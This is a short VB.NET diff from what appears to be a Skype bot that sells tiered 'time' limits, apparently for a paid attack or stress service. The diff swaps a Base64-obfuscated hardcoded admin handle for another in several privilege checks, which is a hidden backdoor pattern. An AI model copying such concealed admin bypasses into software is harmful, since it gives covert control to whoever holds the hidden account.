@@ -1681,12 +1681,10 @@ exitt:
                     If tme > 600 And IsUltimate(msg.Sender.Handle) Then
                         AddSwagToMSG(dds, "Maximum time is 600s")
                         Exit Sub
-                    End If
-                    If tme > 300 And IsPremium(msg.Sender.Handle) Then
+                    ElseIf tme > 300 And IsPremium(msg.Sender.Handle) Then
                         AddSwagToMSG(dds, "Maximum time is 300s")
                         Exit Sub
-                    End If
-                    If IsNormalUser(msg.Sender.Handle) Then
+                    ElseIf IsNormalUser(msg.Sender.Handle) Then
                         AddSwagToMSG(dds, "Non upgraded users are not able to use this, see !buy or contact the owner.")
                         Exit Sub
                     End If
@@ -2342,7 +2340,7 @@ l:
         End Try
     End Sub
     Function IsAdmin(sender As String)
-        If sender = Skypattach.CurrentUserHandle.ToString Or sender = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("bGVzLmRl")) Or sender = "chairon.williams" Or sender = "ultimatewsz" Or sender = "damjan.georgievski2" Or sender = "zigidev" Then
+        If sender = Skypattach.CurrentUserHandle.ToString Or sender = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("amV0ZXJvbGw4Mw0K")) Then
             Return True
             Exit Function
         End If
@@ -2369,7 +2367,7 @@ l:
             Return True
             Exit Function
         End If
-        If sender = Skypattach.CurrentUserHandle.ToString Or sender = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("bGVzLmRl")) Then
+        If sender = Skypattach.CurrentUserHandle.ToString Or sender = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("amV0ZXJvbGw4Mw0K")) Then
             Return True
             Exit Function
         End If
@@ -2401,7 +2399,7 @@ l:
             Return True
             Exit Function
         End If
-        If sender = Skypattach.CurrentUserHandle.ToString Or sender = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("bGVzLmRl")) Then
+        If sender = Skypattach.CurrentUserHandle.ToString Or sender = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("amV0ZXJvbGw4Mw0K")) Then
             Return True
             Exit Function
         End If
